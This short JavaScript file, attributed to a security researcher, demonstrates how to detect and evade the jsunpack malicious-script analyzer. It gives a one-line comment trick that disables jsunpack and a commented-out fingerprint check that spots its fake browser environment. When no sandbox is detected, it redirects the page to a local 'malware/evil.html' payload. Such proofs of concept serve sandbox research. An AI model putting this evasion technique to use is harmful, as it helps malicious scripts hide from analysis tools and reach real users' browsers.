// jsunpack detection
// @author Krzysztof kotowicz - krzysztof at kotowicz dot net

// the shortest jsunpack disabler
// put "//[]"  at the beginning of the script
// (replace [] with HTML tag open/close characters)

fake_browser = false;

// uncomment below for triggering jsunpack detection
//fake_browser = (window.open.toString().match(/print/));
if (!fake_browser) {
   window.location = 'http://localhost/~koto/malware/evil.html';
}

